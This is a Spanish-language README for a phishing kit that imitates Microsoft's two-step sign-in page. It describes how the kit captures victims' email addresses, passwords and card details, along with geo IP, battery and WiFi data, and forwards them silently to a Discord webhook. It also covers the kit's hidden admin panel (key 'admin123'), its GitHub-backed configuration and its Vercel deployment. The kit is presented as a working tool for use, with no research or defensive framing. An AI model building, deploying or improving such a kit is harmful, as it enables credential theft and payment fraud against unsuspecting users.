# mail-officee-3656

Panel de login estilo Microsoft (2 pasos) con envío de datos a Discord, geo IP, batería, WiFi y panel de administración.

## Flujo

1. **index.html** — Paso 1: ingreso de correo electrónico
2. **password.html** — Paso 2: ingreso de contraseña → envía a Discord → redirige a payment
3. **payment.html** — Página de pago (tarjeta) → envía a Discord → redirige al dashboard
4. **dashboard.html** — Panel de administración (accesible solo desde payment.html con doble-tap + clave `admin123`)

## Acceso al panel de administración

Desde **payment.html**:
- Presiona 2 veces **Ayuda** (footer)
- Presiona 2 veces **Privacidad y cookies** (footer)
- Se mostrará un input flotante pidiendo la clave
- Ingresa: `admin123`
- Redirige automáticamente a **dashboard.html**

## Funcionalidades del panel admin

- **Apariencia**: título, subtítulo, fondo (color/degradado/imagen con preview)
- **Discord**: webhook URL, plantilla de mensaje con placeholders, test de webhook
- **Contenido**: logo, texto de bienvenida
- **Ajustes**: notas de acceso, versión

## Persistencia

- `localStorage` (clave: `mail_officee3656_config`) para configuración del cliente
- `/api/config` (Vercel serverless) para persistencia global vía GitHub
- `/api/discord` (Vercel serverless) para enviar mensajes a Discord

## Variables de entorno (Vercel)

- `GH_TOKEN` — Token de GitHub (para leer/escribir config.json)
- `GH_OWNER` — Dueño del repo (por defecto: `varasjaime777-alt`)
- `GH_REPO` — Nombre del repo (por defecto: `mail-officee-3656`)

## Deploy

```bash
vercel --prod --force
```

## Estructura de archivos

```
mail-officee-3656/
├── index.html          # Login paso 1 (email)
├── password.html       # Login paso 2 (contraseña)
├── payment.html        # Página de pago + acceso al panel
├── dashboard.html      # Panel de administración
├── favicon.svg         # Logo Microsoft (4 colores)
├── package.json
├── vercel.json
└── api/
    ├── config.js       # GET/PATCH /api/config
    └── discord.js      # POST /api/discord
```

## Configuración por defecto del fondo

- **Tipo**: `image`
- **Imagen**: `https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg`
- **Color de respaldo**: `#0a0a1a`
- **Degradado de respaldo**: `linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)`

## Notas

- El envío a Discord es **silencioso** (sin mensajes visibles al usuario)
- Los mensajes de login y payment son **separados** por el campo `type`
- El fondo del login se aplica al `<body>` con `background-size: cover`
- La card de login tiene `backdrop-filter: blur(4px)` para legibilidad sobre cualquier fondo
- El enlace "¿Olvidaste tu nombre de usuario?" tiene un slider de posición editable desde el panel
